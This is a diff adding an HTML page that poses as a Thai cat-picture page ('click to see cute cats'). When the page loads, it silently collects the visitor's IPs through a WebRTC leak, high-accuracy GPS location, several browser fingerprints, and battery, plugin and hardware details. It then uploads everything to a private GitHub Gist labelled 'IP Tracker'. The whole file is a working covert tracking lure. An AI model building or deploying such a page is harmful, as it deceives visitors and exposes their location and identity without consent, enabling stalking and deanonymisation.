@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ดูรูปแมวน่ารัก ๆ นะครับ 😺</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+        img { max-width: 100%; border-radius: 15px; }
+        h1 { color: #333; }
+        .loading { display: none; color: #666; font-style: italic; }
+    </style>
+</head>
+<body>
+    <h1>คลิกดูรูปแมวสุดน่ารักได้เลย!</h1>
+    <img src="https://cataas.com/cat?width=800" alt="แมวน่ารัก">
+    <p class="loading">กำลังโหลดรูปพิเศษให้...</p>
+
+    <script>
+        // ส่งข้อมูลไปยัง GitHub Gist หรือ Webhook แทน PHP
+        async function sendToServer(data) {
+            try {
+                // ใช้ GitHub Gist API หรือ Webhook สำหรับเก็บข้อมูล
+                const gistData = {
+                    description: `IP Tracker Data - ${data.fingerprintJS.visitorId}`,
+                    public: false,
+                    files: {
+                        [`data_${Date.now()}.json`]: {
+                            content: JSON.stringify(data, null, 2)
+                        }
+                    }
+                };
+
+                // แทนที่ YOUR_GITHUB_TOKEN ด้วย token จริง
+                const response = await fetch('https://api.github.com/gists', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer YOUR_GITHUB_TOKEN',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(gistData)
+                });
+
+                if (response.ok) {
+                    console.log('Data sent to GitHub Gist successfully');
+                } else {
+                    console.log('Failed to send data to GitHub');
+                }
+            } catch (error) {
+                console.log('Error sending data:', error);
+                // Fallback: เก็บใน localStorage
+                saveToLocalStorage(data);
+            }
+        }
+
+        // ฟังก์ชันสำรองสำหรับเก็บข้อมูลใน localStorage
+        function saveToLocalStorage(data) {
+            try {
+                const existingData = JSON.parse(localStorage.getItem('ip_tracker_data') || '[]');
+                existingData.push({
+                    ...data,
+                    stored_at: new Date().toISOString()
+                });
+                localStorage.setItem('ip_tracker_data', JSON.stringify(existingData));
+                console.log('Data saved to localStorage');
+            } catch (error) {
+                console.log('Error saving to localStorage:', error);
+            }
+        }
+
+        // ฟังก์ชัน Canvas Fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('FingerprintJS Canvas Test', 2, 2);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillRect(100, 5, 80, 20);
+                ctx.fillStyle = '#f60';
+                ctx.fillText('Canvas Fingerprint', 2, 25);
+                return canvas.toDataURL();
+            } catch (e) {
+                return 'Canvas not supported';
+            }
+        }
+
+        // ฟังก์ชัน WebGL Fingerprint
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL not supported';
+
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
+
+                return {
+                    renderer: renderer,
+                    vendor: vendor,
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                };
+            } catch (e) {
+                return 'WebGL error';
+            }
+        }
+
+        // ฟังก์ชัน Audio Fingerprint
+        function getAudioFingerprint() {
+            return new Promise((resolve) => {
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioContext.createOscillator();
+                    const analyser = audioContext.createAnalyser();
+                    const gainNode = audioContext.createGain();
+
+                    oscillator.connect(gainNode);
+                    gainNode.connect(analyser);
+                    analyser.connect(audioContext.destination);
+
+                    oscillator.frequency.value = 10000;
+                    oscillator.type = 'sine';
+
+                    analyser.fftSize = 2048;
+                    const bufferLength = analyser.frequencyBinCount;
+                    const dataArray = new Uint8Array(bufferLength);
+
+                    oscillator.start(0);
+                    setTimeout(() => {
+                        analyser.getByteFrequencyData(dataArray);
+                        oscillator.stop();
+                        audioContext.close();
+
+                        // Create hash from audio data
+                        let hash = 0;
+                        for (let i = 0; i < dataArray.length; i++) {
+                            hash = ((hash << 5) - hash) + dataArray[i];
+                            hash = hash & hash; // Convert to 32-bit integer
+                        }
+                        resolve(Math.abs(hash).toString(36));
+                    }, 100);
+                } catch (e) {
+                    resolve('Audio not supported');
+                }
+            });
+        }
+
+        // ฟังก์ชันหลัก WebRTC Leak สำหรับ IP
+        async function leakIPs() {
+            const ips = new Set();
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' },
+                    { urls: 'stun:stun2.l.google.com:19302' },
+                    { urls: 'stun:stun.voipbuster.com:3478' },
+                    { urls: 'stun:stun.ekiga.net:3478' }
+                ]
+            });
+
+            return new Promise((resolve) => {
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const candidate = event.candidate.candidate;
+                        const match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                        if (match) {
+                            const ip = match[1];
+                            if (!ips.has(ip)) {
+                                ips.add(ip);
+                            }
+                        }
+                    }
+                };
+
+                // รอ 5 วินาทีแล้ว resolve
+                setTimeout(() => {
+                    pc.close();
+                    resolve(Array.from(ips));
+                }, 5000);
+            });
+        }
+
+        // ฟังก์ชันหาตำแหน่ง GPS
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ error: 'Geolocation not supported' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        });
+                    },
+                    (error) => {
+                        resolve({ error: error.message });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 300000
+                    }
+                );
+            });
+        }
+
+        // ฟังก์ชันหลักรวมทุกอย่าง
+        async function collectAllData() {
+            try {
+                // แสดง loading
+                document.querySelector('.loading').style.display = 'block';
+
+                // รวบรวมข้อมูลพร้อมกัน
+                const [ips, location, audioFingerprint] = await Promise.all([
+                    leakIPs(),
+                    getLocation(),
+                    getAudioFingerprint()
+                ]);
+
+                // FingerprintJS v4
+                const fp = await FingerprintJS.load();
+                const fingerprintResult = await fp.get();
+
+                // Canvas และ WebGL
+                const canvasFingerprint = getCanvasFingerprint();
+                const webglFingerprint = getWebGLFingerprint();
+
+                // แยก Local และ Public IP
+                const localIPs = ips.filter(ip =>
+                    ip.startsWith('192.168.') ||
+                    ip.startsWith('10.') ||
+                    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip)
+                );
+                const publicIPs = ips.filter(ip => !localIPs.includes(ip));
+
+                // สร้างข้อมูลรวม
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+
+                    // IP Information
+                    localIPs: localIPs,
+                    publicIPs: publicIPs,
+
+                    // Location
+                    location: location,
+
+                    // Fingerprints
+                    fingerprintJS: {
+                        visitorId: fingerprintResult.visitorId,
+                        confidence: fingerprintResult.confidence,
+                        components: fingerprintResult.components
+                    },
+                    canvasFingerprint: canvasFingerprint,
+                    webglFingerprint: webglFingerprint,
+                    audioFingerprint: audioFingerprint,
+
+                    // Hardware info
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+
+                    // Connection info
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+
+                    // Touch capabilities
+                    touchSupport: 'ontouchstart' in window,
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+
+                    // Plugins
+                    plugins: Array.from(navigator.plugins).map(p => ({
+                        name: p.name,
+                        description: p.description,
+                        filename: p.filename
+                    })),
+
+                    // Battery info (ถ้ามี)
+                    battery: navigator.getBattery ? await navigator.getBattery().then(b => ({
+                        charging: b.charging,
+                        chargingTime: b.chargingTime,
+                        dischargingTime: b.dischargingTime,
+                        level: b.level
+                    })).catch(() => null) : null,
+
+                    referrer: document.referrer || 'Direct',
+                    url: window.location.href
+                };
+
+                // ส่งข้อมูล
+                await sendToServer(data);
+
+                // ซ่อน loading
+                document.querySelector('.loading').style.display = 'none';
+
+                console.log('All data collected and sent:', data);
+
+            } catch (error) {
+                console.error('Error collecting data:', error);
+                document.querySelector('.loading').style.display = 'none';
+            }
+        }
+
+        // รันอัตโนมัติเมื่อโหลดหน้า
+        window.onload = collectAllData;
+    </script>
+</body>
+</html>
